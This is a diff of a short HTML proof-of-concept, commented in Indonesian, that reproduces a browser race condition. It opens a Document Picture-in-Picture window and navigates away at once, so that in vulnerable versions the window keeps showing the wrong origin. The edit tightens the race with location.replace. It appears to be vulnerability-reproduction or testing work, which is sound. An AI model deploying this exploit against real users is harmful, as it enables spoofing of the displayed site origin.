@@ -1,54 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Doc-PiP Async Race Test</title>
-</head>
+<head><meta charset="UTF-8"><title>PiP Fast Race Test</title></head>
 <body>
-    <p>Status: <span id="status">Siap. Klik tombol untuk memulai pengujian.</span></p>
-    <button id="startBtn">Mulai Pengujian Race</button>
+<button id="btn">Klik Sekali</button>
+<script>
+document.getElementById('btn').addEventListener('click', async () => {
+    try {
+        // Buka Document PiP terlebih dahulu
+        const pipWin = await documentPictureInPicture.requestWindow({width:320, height:240});
+        pipWin.document.body.innerHTML = '<h1>PiP</h1>';
 
-    <script>
-    (function() {
-        const statusEl = document.getElementById('status');
-        const startBtn = document.getElementById('startBtn');
-
-        // Video sangat pendek untuk memenuhi persyaratan pemutaran media PiP
-        const video = document.createElement('video');
-        video.src = 'data:video/mp4;base64,...'; // Harus diganti dengan base64 video yang valid
-        video.muted = true;
-        video.playsInline = true;
-        video.loop = true;
-        video.style.width = '100px';
-        document.body.appendChild(video);
-
-        async function triggerRace() {
-            statusEl.textContent = 'Meminta jendela Document PiP...';
-
-            try {
-                // Inti: meminta Document PiP (memerlukan gesture pengguna, yaitu klik tombol)
-                const pipWindow = await documentPictureInPicture.requestWindow({
-                    width: 320,
-                    height: 240
-                });
-
-                statusEl.textContent = 'Jendela PiP berhasil dibuka, segera melakukan navigasi...';
-
-                // Race condition: segera navigasi setelah PiP terbuka
-                // Pada versi yang rentan, observer belum terdaftar, navigasi terlewat,
-                // sehingga PiP tetap ada dan menampilkan sumber yang salah.
-                window.location.href = 'https://www.google.com';
-
-            } catch (e) {
-                statusEl.textContent = 'Document PiP gagal: ' + e.message;
-                // Jika Document PiP tidak didukung, fallback ke video PiP biasa
-                // (CVE ini terutama untuk Document PiP, tetapi video PiP mungkin memiliki perilaku serupa)
-            }
-        }
-
-        startBtn.addEventListener('click', triggerRace, { once: true });
-    })();
-    </script>
+        // Gunakan location.replace untuk navigasi secepat mungkin,
+        // mempersempit jendela waktu antara pembukaan PiP dan navigasi
+        window.location.replace('https://www.google.com');
+    } catch(e) {
+        console.log('PiP gagal:', e.message);
+    }
+});
+</script>
 </body>
 </html>
